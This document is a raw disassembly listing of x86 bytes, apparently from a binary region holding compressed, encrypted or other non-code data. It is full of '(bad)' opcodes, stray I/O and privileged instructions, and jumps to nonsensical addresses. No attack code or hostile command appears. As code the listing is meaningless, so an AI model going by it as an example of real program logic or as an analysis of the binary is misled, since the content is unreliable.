  42c822:	repz add bh,bh
  42c825:	push   es
  42c826:	les    ecx,FWORD PTR [ebx-0x5685d196]
  42c82c:	fwait
  42c82d:	push   edx
  42c82e:	mov    al,ds:0x220589a9
  42c833:	test   al,0xa4
  42c835:	cmp    edi,DWORD PTR [edi+0x12]
  42c838:	fistp  DWORD PTR [edx-0x52616947]
  42c83e:	jl     0x42c8b9
  42c840:	out    dx,al
  42c841:	inc    ebx
  42c842:	mov    ds:0xf0952a01,eax
  42c847:	dec    edi
  42c848:	mov    ch,0xb0
  42c84a:	pusha  
  42c84b:	nop
  42c84c:	push   esp
  42c84d:	xor    eax,0xb855a38b
  42c852:	icebp  
  42c853:	cs ds cdq 
  42c856:	adc    al,0xe
  42c858:	jg     0x42c7fd
  42c85a:	xchg   esi,eax
  42c85b:	les    esi,FWORD PTR [edi+0x60]
  42c85e:	aam    0xc2
  42c860:	test   BYTE PTR [edi+0x56],dl
  42c863:	push   es
  42c864:	loop   0x42c8b6
  42c866:	add    eax,0x1d863fb4
  42c86b:	push   esp
  42c86c:	and    BYTE PTR [eax],cl
  42c86e:	push   esp
  42c86f:	mov    dh,0x4
  42c871:	mov    ebp,0x991d679c
  42c876:	adc    edx,DWORD PTR [esp+ecx*4+0x34]
  42c87a:	sub    eax,0x4d30c9
  42c87f:	pop    esi
  42c880:	push   ebp
  42c881:	jae    0x42c80b
  42c883:	cld    
  42c884:	xlat   BYTE PTR ds:[ebx]
  42c885:	pop    ebx
  42c886:	icebp  
  42c887:	or     bh,BYTE PTR [ecx-0x1]
  42c88a:	mov    WORD PTR [ecx+0x7d2aa5ce],ds
  42c890:	xor    ch,0xa9
  42c893:	sub    ah,BYTE PTR [esi+0x1b570933]
  42c899:	jp     0x42c8d1
  42c89b:	(bad)  
  42c89c:	push   0x6ec2ff00
  42c8a1:	fimul  WORD PTR [eax-0x12deee13]
  42c8a7:	popf   
  42c8a8:	(bad)  
  42c8a9:	es sub eax,0xc8ec073d
  42c8af:	push   esp
  42c8b0:	leave  
  42c8b1:	xlat   BYTE PTR ds:[ebx]
  42c8b2:	repz out dx,al
  42c8b4:	dec    ecx
  42c8b5:	cmp    BYTE PTR cs:[ebp+0x22c0b3ce],dl
  42c8bc:	dec    ebp
  42c8bd:	ja     0x42c8d1
  42c8bf:	or     al,0xa5
  42c8c1:	pushf  
  42c8c2:	pop    eax
  42c8c3:	xor    ah,cl
  42c8c5:	xchg   edi,eax
  42c8c6:	pop    ss
  42c8c7:	or     BYTE PTR [eax+0x77],dh
  42c8ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8cb:	pop    esp
  42c8cc:	or     esp,esp
  42c8ce:	push   ecx
  42c8cf:	jmp    0x512c:0xfae7518c
  42c8d6:	loop   0x42c8f4
  42c8d8:	cmp    bl,cl
  42c8da:	inc    esp
  42c8db:	std    
  42c8dc:	cmp    bl,BYTE PTR [ebp+0x6c7398a7]
  42c8e2:	inc    esi
  42c8e3:	jecxz  0x42c8bb
  42c8e5:	mov    esp,0x365ad768
  42c8ea:	jae    0x42c8a7
  42c8ec:	mov    al,ds:0xa2569f4f
  42c8f1:	shl    BYTE PTR fs:[eax+eiz*2],0x86
  42c8f6:	lods   eax,DWORD PTR ds:[esi]
  42c8f7:	das    
  42c8f8:	xor    eax,0xe80a4094
  42c8fd:	mov    esi,0x63bb4803
  42c902:	pop    ebp
  42c903:	adc    DWORD PTR [ecx+0x7f],ecx
  42c906:	jl     0x42c90a
  42c908:	fmul   QWORD PTR [eax+0x6d]
  42c90b:	das    
  42c90c:	cmp    DWORD PTR ds:0xc091,0x0
	...
  42c972:	add    BYTE PTR [eax],al
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x4a29248c
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	mov    DWORD PTR [ecx],eax
  42c98e:	sbb    esi,DWORD PTR [ecx+eiz*2+0x6a]
  42c992:	dec    edx
  42c993:	pop    ds
  42c994:	or     DWORD PTR [edi],esp
  42c996:	int3   
  42c997:	popf   
  42c998:	or     ecx,0x3f
  42c99b:	dec    esi
  42c99c:	add    ebp,DWORD PTR [edx]
  42c99e:	and    cl,BYTE PTR [bx+di+0x403b]
  42c9a3:	mov    ch,0xa5
  42c9a5:	adc    esp,ebx
  42c9a7:	vpsubw xmm4,xmm0,XMMWORD PTR [eax-0x3]
  42c9ac:	and    edx,0x5b23c8cf
  42c9b2:	imul   ebx,eax,0xfffffff9
  42c9b5:	pop    eax
  42c9b6:	addr16 addr16 jmp 0xc570f410
  42c9bd:	dec    eax
  42c9be:	adc    BYTE PTR [eax-0x543067aa],dh
  42c9c4:	add    dh,BYTE PTR [eax-0x23]
  42c9c7:	inc    esp
  42c9c8:	mov    edi,0xc0980574
  42c9cd:	jmp    0x4d773b73
  42c9d2:	push   ecx
  42c9d3:	aam    0xd9
  42c9d5:	bound  ebp,QWORD PTR [edi]
  42c9d7:	clc    
  42c9d8:	iret   
  42c9d9:	or     eax,DWORD PTR [eax+0x2998f7aa]
  42c9df:	(bad)  
  42c9e0:	(bad)  
  42c9e1:	daa    
  42c9e2:	in     al,dx
  42c9e3:	scas   eax,DWORD PTR es:[edi]
  42c9e4:	in     eax,0x7b
  42c9e6:	add    al,0xf4
  42c9e8:	jnp    0x42c9e3
  42c9ea:	adc    BYTE PTR [edi-0x4c],dl
  42c9ed:	inc    edx
  42c9ee:	mov    BYTE PTR [edx+0x152ee1b5],ch
  42c9f4:	sub    ecx,DWORD PTR [ebx+0x5f]
  42c9f7:	dec    ecx
  42c9f8:	ins    DWORD PTR es:[edi],dx
  42c9f9:	mov    ds:0x89d26baf,eax
  42c9fe:	xchg   ebp,eax
  42c9ff:	and    al,0x32
  42ca01:	dec    edx
  42ca02:	leave  
  42ca03:	mov    ds:0xddca11c5,eax
  42ca08:	lds    esp,FWORD PTR [eax+0x4189b82a]
  42ca0e:	or     BYTE PTR [ecx],dl
  42ca10:	jecxz  0x42ca83
  42ca12:	push   ebp
  42ca13:	adc    bl,BYTE PTR [ebx]
  42ca15:	xor    esi,DWORD PTR [esi-0x29]
  42ca18:	jmp    0x42ca08
  42ca1a:	mov    eax,0x18517d33
  42ca1f:	jne    0x42c9a7
  42ca21:	xor    al,0x88
  42ca23:	jl     0x42ca4a
  42ca25:	cmp    dh,BYTE PTR ds:0xbc622c35
  42ca2b:	xchg   esp,eax
  42ca2c:	mov    dl,0xb9
  42ca2e:	jne    0x42ca56
  42ca30:	fistp  DWORD PTR [esi+0x4d5e1f40]
  42ca36:	and    ch,BYTE PTR [esi+0x42053efe]
  42ca3c:	loop   0x42ca93
  42ca3e:	jmp    0x42c9d1
  42ca40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca41:	mov    ebp,0x33313e67
  42ca46:	aad    0x60
  42ca48:	mov    dl,0x15
  42ca4a:	std    
  42ca4b:	ja     0x42ca87
  42ca4d:	mov    ch,0x7a
  42ca4f:	jle    0x42cabf
  42ca51:	test   al,0x6a
  42ca53:	shr    BYTE PTR gs:[esi],cl
  42ca56:	imul   esp,ebx,0x48c06fb1
  42ca5c:	xor    al,0x66
  42ca5e:	repnz xor ebp,DWORD PTR [ebp+0x76c8a55b]
  42ca65:	popa   
  42ca66:	in     al,0x16
  42ca68:	mov    eax,0x81f8e811
  42ca6d:	fnsave [edx+0x27]
  42ca70:	push   ss
  42ca71:	stc    
  42ca72:	add    eax,0xc6dcda0e
  42ca77:	xchg   edx,eax
  42ca78:	mov    ebx,0x161b86de
  42ca7d:	shl    esp,1
  42ca7f:	call   0x1b74:0xd98be941
  42ca86:	pop    esi
  42ca87:	gs sbb eax,0x5da9d3d7
  42ca8d:	(bad)  
  42ca8e:	cmp    al,0xb0
	...
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0xb676ec0]
  42cb02:	es cmp eax,0x1ddfc
  42cb08:	add    al,0x1
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	into   
  42cb0d:	rcl    DWORD PTR [ecx],cl
  42cb0f:	icebp  
  42cb10:	loop   0x42cb7b
  42cb12:	xor    BYTE PTR [edi+ebp*2-0x182a5f45],bl
  42cb19:	retf   0x455a
  42cb1c:	xchg   edx,eax
  42cb1d:	sbb    al,0x60
  42cb1f:	push   ebp
  42cb20:	(bad)  
  42cb22:	lods   eax,DWORD PTR ds:[esi]
  42cb23:	sub    eax,0x3128359f
  42cb28:	cmp    eax,DWORD PTR [ebp+ebx*8+0x73]
  42cb2c:	mov    eax,0xd88dc04
  42cb31:	dec    ebp
  42cb32:	xchg   esp,eax
  42cb33:	das    
  42cb34:	int    0x21
  42cb36:	push   es
  42cb37:	dec    eax
  42cb38:	fdivp  st(4),st
  42cb3a:	sbb    DWORD PTR [edi-0x32],ecx
  42cb3d:	inc    ebx
  42cb3e:	xlat   BYTE PTR ds:[ebx]
  42cb3f:	sub    eax,0x45c004
  42cb44:	cli    
  42cb45:	sar    DWORD PTR [ebx+0xb],cl
  42cb48:	inc    ebx
  42cb49:	test   al,0x5b
  42cb4b:	cld    
  42cb4c:	add    BYTE PTR ds:0xc585aa1b,dh
  42cb52:	jne    0x42cbc5
  42cb54:	nop
  42cb55:	mov    BYTE PTR [ebp+0x4a],bl
  42cb58:	mov    dl,0x72
  42cb5a:	fnsave ds:0x7f72090c
  42cb60:	fld    TBYTE PTR [ebp-0x2886129]
  42cb66:	fwait
  42cb67:	pop    esp
  42cb68:	cli    
  42cb69:	mov    al,ds:0x76aef3a1
  42cb6e:	cmp    eax,0x74b0dc98
  42cb73:	adc    BYTE PTR [edi],dl
  42cb75:	cmp    ebp,DWORD PTR [esi-0x41]
  42cb78:	adc    DWORD PTR [ebp+0x28],ebp
  42cb7b:	push   ebp
  42cb7c:	lahf   
  42cb7d:	sub    al,0x29
  42cb7f:	in     eax,dx
  42cb80:	scas   eax,DWORD PTR es:[edi]
  42cb81:	sub    DWORD PTR [edi+0x40],0x9ded1391
  42cb88:	mov    esi,0x6cc8dcd9
  42cb8d:	clc    
  42cb8e:	mov    esp,0x9cab463d
  42cb93:	mov    bl,0x5c
  42cb95:	stc    
  42cb96:	mov    dl,0x91
  42cb98:	mov    ebp,0x5bc0b0df
  42cb9d:	loope  0x42cbb7
  42cb9f:	scas   eax,DWORD PTR es:[edi]
  42cba0:	ins    DWORD PTR es:[edi],dx
  42cba1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cba2:	shr    ebp,0x0
  42cba5:	retf   
  42cba6:	sbb    BYTE PTR [ecx+edx*8],dh
  42cba9:	jl     0x42cb2c
  42cbab:	nop
  42cbac:	mov    dh,0xbd
  42cbae:	mov    ds:0x32e17dcd,al
  42cbb3:	clc    
  42cbb4:	lods   al,BYTE PTR ds:[esi]
  42cbb5:	xchg   esp,eax
  42cbb6:	ja     0x42cb68
  42cbb8:	(bad)  
  42cbb9:	std    
  42cbba:	push   eax
  42cbbb:	xor    al,0x2e
  42cbbd:	rcr    BYTE PTR [ecx+edi*1],0xd
  42cbc1:	stos   DWORD PTR es:[edi],eax
  42cbc2:	jno    0x42cc2d
  42cbc4:	or     DWORD PTR [ecx-0x65],0x38
  42cbc8:	int    0x66
  42cbca:	retf   
  42cbcb:	mov    ch,0xd8
  42cbcd:	mov    cl,0xf8
  42cbcf:	hlt    
  42cbd0:	(bad)  
  42cbd1:	push   ebx
  42cbd2:	rcr    DWORD PTR [edx],1
  42cbd4:	inc    eax
  42cbd5:	cmc    
  42cbd6:	mov    ds:0x9ca8acb2,al
  42cbdb:	popa   
  42cbdc:	xchg   ebx,eax
  42cbdd:	sub    DWORD PTR [esi+0x5d],0x77
  42cbe1:	mov    eax,0x9025d377
  42cbe6:	adc    eax,0x972dd71d
  42cbeb:	sbb    eax,0x54d278a
  42cbf0:	ins    BYTE PTR es:[edi],dx
  42cbf1:	push   ds
  42cbf2:	jno    0x42cc44
  42cbf4:	dec    eax
  42cbf5:	add    eax,DWORD PTR [eax+edx*1+0x3f]
  42cbf9:	pop    ecx
  42cbfa:	or     al,0x42
  42cbfc:	popa   
  42cbfd:	sti    
  42cbfe:	fild   DWORD PTR [eax]
  42cc00:	dec    eax
  42cc01:	jl     0x42cbea
  42cc03:	push   es
  42cc04:	pop    esi
  42cc05:	retf   0x44ab
  42cc08:	aam    0x8
  42cc0a:	leave  
  42cc0b:	into   
  42cc0c:	mov    esp,0x7fc8a8
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x4f4ff5a3
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	add    ebx,DWORD PTR [eax-0x664ca1bb]
  42cc92:	push   ebp
  42cc93:	mov    al,0x81
  42cc95:	xchg   esi,eax
  42cc96:	popf   
  42cc97:	or     eax,0x38fdeec7
  42cc9c:	(bad)  
  42cc9d:	popf   
  42cc9e:	jns    0x42cc95
  42cca0:	xchg   esp,eax
  42cca1:	jne    0x42cce7
  42cca3:	aam    0x51
  42cca5:	pop    ecx
  42cca6:	dec    edx
  42cca7:	push   eax
  42cca8:	jae    0x42cc6c
  42ccaa:	dec    ebp
  42ccab:	sahf   
  42ccac:	push   es
  42ccad:	icebp  
  42ccae:	push   eax
  42ccaf:	push   DWORD PTR [edx-0xa235c69]
  42ccb5:	pop    es
  42ccb6:	add    BYTE PTR [ebx],ch
  42ccb8:	ret    0x2cd5
  42ccbb:	ins    BYTE PTR es:[edi],dx
  42ccbc:	in     al,dx
  42ccbd:	sahf   
  42ccbe:	pop    ebp
  42ccbf:	push   esp
  42ccc0:	jmp    FWORD PTR ds:0xcfb3efd2
  42ccc6:	ret    0x4bc7
  42ccc9:	mov    eax,ds:0xc171cb36
  42ccce:	mov    edx,0x7592a0db
  42ccd3:	jae    0x42ccec
  42ccd5:	mov    ebp,0xfc8e4523
  42ccda:	enter  0xf7fe,0x96
  42ccde:	pushf  
  42ccdf:	or     eax,0x58f091d2
  42cce4:	out    dx,al
  42cce5:	cld    
  42cce6:	scas   eax,DWORD PTR es:[edi]
  42cce7:	mov    DWORD PTR [edi-0x1e37c978],edx
  42cced:	mov    ebp,0xd84e7e80
  42ccf2:	pop    esi
  42ccf3:	jmp    0x7223:0xafc92fe9
  42ccfa:	pop    ebp
  42ccfb:	or     ebx,DWORD PTR [ecx]
  42ccfd:	dec    eax
  42ccfe:	push   ss
  42ccff:	lds    esi,FWORD PTR [eax+ebp*2+0x79776b72]
  42cd06:	xchg   edi,eax
  42cd07:	sbb    edx,DWORD PTR [ecx-0x507674ca]
  42cd0d:	xchg   ebp,eax
  42cd0e:	cld    
  42cd0f:	pop    esi
  42cd10:	aad    0xc
  42cd12:	adc    BYTE PTR [ecx],ah
  42cd14:	mov    BYTE PTR [edi+0x4beabd3b],bh
  42cd1a:	mov    bl,0xb5
  42cd1c:	lods   eax,DWORD PTR ds:[esi]
  42cd1d:	outs   dx,DWORD PTR ds:[esi]
  42cd1e:	inc    ecx
  42cd1f:	mov    ah,0xc9
  42cd21:	mov    ebp,0xa854b685
  42cd26:	mov    ch,0x41
  42cd28:	sub    DWORD PTR [edx-0x217ec515],ebp
  42cd2e:	imul   esi,DWORD PTR [ebx],0xfffffff4
  42cd31:	ins    BYTE PTR es:[edi],dx
  42cd32:	bound  edi,QWORD PTR [ebx+0x63]
  42cd35:	stc    
  42cd36:	or     esp,esi
  42cd38:	rcr    ecx,cl
  42cd3a:	pop    es
  42cd3b:	xchg   esp,eax
  42cd3c:	iret   
  42cd3d:	xchg   edx,ebp
  42cd3f:	out    dx,eax
  42cd40:	adc    DWORD PTR [edi+0x6e],edx
  42cd43:	fisttp WORD PTR [eax]
  42cd45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd46:	loopne 0x42cd9e
  42cd48:	pop    ss
  42cd49:	jmp    0x7f7c40e0
  42cd4e:	and    ebp,DWORD PTR fs:[edx-0x6af3f0c2]
  42cd55:	cmp    BYTE PTR [ebp-0x403764b4],bl
  42cd5b:	ss jmp 0x4179edbf
  42cd61:	dec    edi
  42cd62:	outs   dx,BYTE PTR ds:[esi]
  42cd63:	xchg   esp,eax
  42cd64:	enter  0x1d0c,0x6
  42cd68:	ror    bh,0xda
  42cd6b:	or     al,0xc3
  42cd6d:	mov    bl,0x2
  42cd6f:	xchg   ecx,eax
  42cd70:	inc    edi
  42cd71:	dec    ebp
  42cd72:	dec    ecx
  42cd73:	pop    ds
  42cd74:	(bad)  
  42cd75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cd76:	push   esp
  42cd77:	pop    ebp
  42cd78:	imul   BYTE PTR [esi]
  42cd7a:	or     BYTE PTR [eax+0x58],bl
  42cd7d:	aas    
  42cd7e:	adc    al,0xdd
  42cd80:	stos   BYTE PTR es:[edi],al
  42cd81:	std    
  42cd82:	fyl2xp1 
  42cd84:	xlat   BYTE PTR ds:[ebx]
  42cd85:	lahf   
  42cd86:	lods   eax,DWORD PTR ds:[esi]
  42cd87:	xor    BYTE PTR [edi+0x397647a3],bl
  42cd8d:	sbb    eax,0x502f
	...
  42cdf2:	add    BYTE PTR [eax],al
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x15
  42ce01:	bound  ebp,QWORD PTR [ebx]
  42ce03:	imul   eax,DWORD PTR [eax+eiz*8],0x1
  42ce07:	add    BYTE PTR [ecx+eax*1],al
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	pop    ebx
  42ce0d:	xlat   BYTE PTR ds:[ebx]
  42ce0e:	cmp    DWORD PTR [eax-0xf],ecx
  42ce11:	sub    ebp,DWORD PTR [ebx+ecx*4-0x28]
  42ce15:	push   edi
  42ce16:	inc    esi
  42ce17:	stos   DWORD PTR es:[edi],eax
  42ce18:	hlt    
  42ce19:	xlat   BYTE PTR ds:[ebx]
  42ce1a:	dec    edi
  42ce1b:	push   ebx
  42ce1c:	pop    ebx
  42ce1d:	rcr    DWORD PTR [edi],1
  42ce1f:	test   BYTE PTR [eax+0x66390736],0xd
  42ce26:	inc    ebx
  42ce27:	ins    BYTE PTR es:[edi],dx
  42ce28:	xor    eax,0xa00c6b52
  42ce2d:	adc    esi,DWORD PTR [ecx-0x75]
  42ce30:	inc    edx
  42ce31:	arpl   WORD PTR [ebx],dx
  42ce33:	mov    DWORD PTR [edx],eax
  42ce35:	aaa    
  42ce36:	popf   
  42ce37:	mov    cl,0xa7
  42ce39:	sbb    bh,BYTE PTR [ebp-0x3d471fec]
  42ce3f:	pop    edi
  42ce40:	not    BYTE PTR [edx-0x248520ee]
  42ce46:	mov    ah,0x32
  42ce48:	mov    esi,0xa2d72468
  42ce4d:	and    edx,ebp
  42ce4f:	sub    bh,al
  42ce51:	jns    0x42cecc
  42ce53:	(bad)
  42ce56:	popf   
  42ce57:	and    BYTE PTR [ecx],bl
  42ce59:	jnp    0x42ce2f
  42ce5b:	jo     0x42ce71
  42ce5d:	mov    ch,0x22
  42ce5f:	ret    0xa004
  42ce62:	mov    ah,0xef
  42ce64:	repz xor dl,BYTE PTR [esi]
  42ce67:	cmp    ebp,0xfd9ae0e5
  42ce6d:	add    eax,0xe49d7850
  42ce72:	mov    al,0x54
  42ce74:	repnz sbb eax,0x75727c92
  42ce7a:	dec    esp
  42ce7b:	inc    edx
  42ce7c:	enter  0xafbd,0x40
  42ce80:	mov    cl,0xa6
  42ce82:	mov    al,ds:0xd85b9168
  42ce87:	out    dx,eax
  42ce88:	fistp  DWORD PTR [edi-0x7092abca]
  42ce8e:	dec    edi
  42ce8f:	(bad)  
  42ce90:	fistp  DWORD PTR [ebx-0x16]
  42ce93:	add    DWORD PTR ds:0x67c6f0dd,ebp
  42ce99:	and    DWORD PTR [esi+0x36],ebp
  42ce9c:	(bad)  
  42ce9d:	mov    ds:0x6b905953,al
  42cea2:	aad    0x1f
  42cea4:	out    dx,al
  42cea5:	aam    0x2b
  42cea7:	push   0x73
  42cea9:	push   cs
  42ceaa:	in     eax,0xcf
  42ceac:	ja     0x42cf28
  42ceae:	div    BYTE PTR [esi-0x3d]
  42ceb1:	or     eax,0x8b61c69c
  42ceb6:	sbb    BYTE PTR [esi],ch
  42ceb8:	cmp    al,0x20
  42ceba:	mov    dl,0x1c
  42cebc:	js     0x42ce52
  42cebe:	sbb    DWORD PTR [edx+0x37],esi
  42cec1:	inc    ebx
  42cec2:	xor    eax,0x35d720d4
  42cec7:	adc    eax,0x308c0df9
  42cecc:	xchg   esp,eax
  42cecd:	sahf   
  42cece:	adc    BYTE PTR [esi+edi*1+0x4203abbb],cl
  42ced5:	push   0x72
  42ced7:	inc    eax
  42ced8:	mov    edi,0xa544234c
  42cedd:	jp     0x42cf1e
  42cedf:	or     cl,BYTE PTR [edi]
  42cee1:	(bad)  
  42cee2:	xor    BYTE PTR [ebp+ecx*4-0x6ab4f14c],dl
  42cee9:	jecxz  0x42cedd
  42ceeb:	(bad)  
  42ceec:	out    0xe0,eax
  42ceee:	or     eax,0xcb2e196d
  42cef3:	ins    DWORD PTR es:[edi],dx
  42cef4:	lea    esp,[ebx+edx*2-0x6c]
  42cef8:	(bad)  
  42cef9:	scas   al,BYTE PTR es:[edi]
  42cefa:	paddd  mm6,mm1
  42cefd:	pop    esi
  42cefe:	mov    ch,0xfc
  42cf00:	pop    ss
  42cf01:	es cwde 
  42cf03:	and    al,0xdb
  42cf05:	inc    edx
  42cf06:	scas   eax,DWORD PTR es:[edi]
  42cf07:	fldcw  WORD PTR [esi-0x16]
  42cf0a:	ins    DWORD PTR es:[edi],dx
  42cf0b:	sbb    DWORD PTR [esi+edi*4+0xc298],ebp
	...
  42cf72:	add    BYTE PTR [eax],al
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    eax,FWORD PTR [eax+0x13]
  42cf82:	inc    edx
  42cf83:	xchg   edx,eax
  42cf84:	or     cl,ah
  42cf86:	add    DWORD PTR [eax],eax
  42cf88:	add    al,0x1
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	mov    dl,0x7
  42cf8e:	sbb    BYTE PTR [esi-0x44],ah
  42cf91:	or     BYTE PTR [ecx-0x60],cl
  42cf94:	sti    
  42cf95:	add    eax,esi
  42cf97:	sbb    DWORD PTR [eax+0x70],0xd83c5fa6
  42cf9e:	mov    ds:0x54916390,eax
  42cfa3:	pop    esi
  42cfa4:	cmp    ecx,esi
  42cfa6:	(bad)  
  42cfa7:	pop    ecx
  42cfa8:	push   esp
  42cfa9:	mov    eax,ds:0x3bed56fc
  42cfae:	mov    al,0xc4
  42cfb0:	call   DWORD PTR [edi]
  42cfb2:	push   esp
  42cfb3:	and    esi,DWORD PTR [esp+eiz*2-0x47f6a434]
  42cfba:	sbb    bh,BYTE PTR [eax]
  42cfbc:	mov    dh,BYTE PTR [ebp-0x6135cdd6]
  42cfc2:	sub    al,0xb8
  42cfc4:	sbb    eax,0xed55a975
  42cfc9:	mov    DWORD PTR ds:0x20cd9497,ebp
  42cfcf:	adc    edx,ebp
  42cfd1:	cmp    DWORD PTR [esi-0x2a],ebp
  42cfd4:	xchg   edx,eax
  42cfd5:	pop    ss
  42cfd6:	push   ss
  42cfd7:	dec    edi
  42cfd8:	fnstenv [esp]
  42cfdb:	ds repnz xchg esi,eax
  42cfde:	pop    edx
  42cfdf:	or     ebp,esi
  42cfe1:	jp     0x42d056
  42cfe3:	pop    es
  42cfe4:	xor    ch,BYTE PTR [esi+ebx*4]
  42cfe7:	sbb    eax,0xf3aa8763
  42cfec:	mov    al,ds:0xa68c4338
  42cff1:	or     dl,dl
  42cff3:	das    
  42cff4:	call   0x8db1:0x62d9d7c8
  42cffb:	popa   
  42cffc:	and    DWORD PTR [edi],ebp
  42cffe:	mov    DWORD PTR [ecx-0x6f],0x15732633
  42d005:	sbb    ebx,DWORD PTR [ecx]
  42d007:	adc    esi,eax
  42d009:	ficomp WORD PTR [eax+esi*2-0x2775a97c]
  42d010:	pop    ds
  42d011:	jbe    0x42d056
  42d013:	pop    eax
  42d014:	cmp    esi,eax
  42d016:	xlat   BYTE PTR ds:[ebx]
  42d017:	mov    edi,0x2dd4dc25
  42d01c:	scas   al,BYTE PTR es:[edi]
  42d01d:	sar    BYTE PTR [ebx+0x35],cl
  42d020:	pop    esi
  42d021:	dec    esi
  42d022:	lahf   
  42d023:	add    cl,BYTE PTR ds:0x4d2fdc64
  42d029:	jae    0x42d098
  42d02b:	lds    ebx,FWORD PTR [edi+0x6c65bfb]
  42d031:	aas    
  42d032:	and    esp,DWORD PTR [ebx]
  42d034:	mov    ch,dh
  42d036:	xchg   ebp,eax
  42d037:	test   BYTE PTR [edi],ch
  42d039:	add    al,0xb2
  42d03b:	out    0x1,eax
  42d03d:	mov    BYTE PTR [edi],dh
  42d03f:	scas   eax,DWORD PTR es:[edi]
  42d040:	sub    cl,BYTE PTR [edx]
  42d042:	mov    dl,0xa5
  42d044:	dec    ebx
  42d045:	jmp    0x665b73be
  42d04a:	aas    
  42d04b:	ins    BYTE PTR es:[edi],dx
  42d04c:	stos   DWORD PTR es:[edi],eax
  42d04d:	fiadd  DWORD PTR [ecx]
  42d04f:	xor    bl,BYTE PTR [ecx]
  42d051:	cmp    DWORD PTR [ecx-0x2757b2d6],ebx
  42d057:	jmp    0x42d04b
  42d059:	(bad)  
  42d05b:	push   ds
  42d05c:	fadd   QWORD PTR [eax-0x7a]
  42d05f:	ffreep st(4)
  42d061:	pop    ds
  42d062:	jg     0x42cfeb
  42d064:	cmp    ebx,edx
  42d066:	mov    eax,ds:0x2ddeeedb
  42d06b:	adc    ah,dh
  42d06d:	mov    ah,0xe8
  42d06f:	stos   BYTE PTR es:[edi],al
  42d070:	mov    bl,0x3c
  42d072:	das    
  42d073:	and    DWORD PTR [ebp-0x74],eax
  42d076:	mul    BYTE PTR [edi+0x43a47943]
  42d07c:	push   ecx
  42d07d:	xchg   DWORD PTR [edx+eiz*2],eax
  42d080:	jecxz  0x42d099
  42d082:	iret   
  42d083:	out    0x9f,al
  42d085:	outs   dx,BYTE PTR ds:[esi]
  42d086:	or     DWORD PTR [ebp+0x1fe6b830],0xffffffbb
  42d08d:	push   esi
  42d08e:	dec    ecx
  42d08f:	add    BYTE PTR gs:[eax],al
	...
  42d0f2:	add    BYTE PTR [eax],al
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [eax+esi*2-0x7d],bl
  42d103:	cld    
  42d104:	or     al,0xe2
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    al,0x1
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	adc    bh,BYTE PTR [ebx+0x67]
  42d10f:	pop    eax
  42d110:	mov    cl,0xf4
  42d112:	push   cs
  42d113:	ds in  eax,0xf4
  42d116:	fwait
  42d117:	shl    cl,0x59
  42d11a:	cmp    esi,eax
  42d11c:	push   cs
  42d11d:	fdivr  DWORD PTR [edi]
  42d11f:	stc    
  42d120:	aas    
  42d121:	mov    dl,0xdb
  42d123:	int    0x88
  42d125:	stc    
  42d126:	mov    ds:0xd356ebbd,eax
  42d12b:	or     eax,0x7323a9f3
  42d130:	jg     0x42d0b3
  42d132:	cwde   
  42d133:	pop    edi
  42d134:	ins    DWORD PTR es:[edi],dx
  42d135:	cmp    bl,cl
  42d137:	out    dx,al
  42d138:	sub    al,0xe
  42d13a:	retf   
  42d13b:	jns    0x42d121
  42d13d:	xor    eax,0xb2665a98
  42d142:	ins    BYTE PTR es:[edi],dx
  42d143:	fs jmp 0x5702edca
  42d149:	jae    0x42d173
  42d14b:	pop    edx
  42d14c:	mov    al,ds:0x94587964
  42d151:	jmp    0xd3f082e5
  42d156:	add    DWORD PTR [ecx-0x7605b201],esi
  42d15c:	fnstcw WORD PTR [ecx-0x1c09aca4]
  42d162:	xchg   esp,eax
  42d163:	inc    edi
  42d164:	(bad)  
  42d165:	sbb    ebp,DWORD PTR [edi-0x1a]
  42d168:	push   ds
  42d169:	pop    ds
  42d16a:	jmp    0x69cd4254
  42d16f:	(bad)  
  42d170:	rol    ah,0x84
  42d173:	mov    ch,0x16
  42d175:	lahf   
  42d176:	in     eax,0x6a
  42d178:	mov    ebp,0xfa7b7de3
  42d17d:	adc    dh,BYTE PTR [esi]
  42d17f:	dec    eax
  42d180:	cmp    ebx,DWORD PTR [esi-0x1cc4623d]
  42d186:	mov    ah,0x63
  42d188:	aad    0xe0
  42d18a:	(bad)  
  42d18b:	dec    edi
  42d18c:	pop    ebp
  42d18d:	not    BYTE PTR [edx]
  42d18f:	mov    al,0x5b
  42d191:	push   esp
